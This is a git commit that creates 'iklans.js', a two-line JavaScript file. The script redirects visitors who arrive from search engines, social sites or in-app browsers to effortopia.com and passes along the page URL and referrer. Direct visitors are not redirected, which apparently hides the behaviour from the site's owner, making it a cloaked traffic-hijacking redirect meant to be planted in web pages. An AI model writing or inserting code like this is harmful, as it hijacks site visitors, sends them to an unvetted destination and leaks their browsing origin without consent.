dee73ae0dccae40a3de9aa827d6376b9987a7500
tunggulwulung <94102878+tunggulwulung@users.noreply.github.com>
2021-11-11 14:28:33 +0700

    Create iklans.js

---
+++ iklans.js
@@ -0,0 +1,2 @@
+var ars = 'https://effortopia.com';
+if(['.reddit.','.instagram.','.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', '.yahoo.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
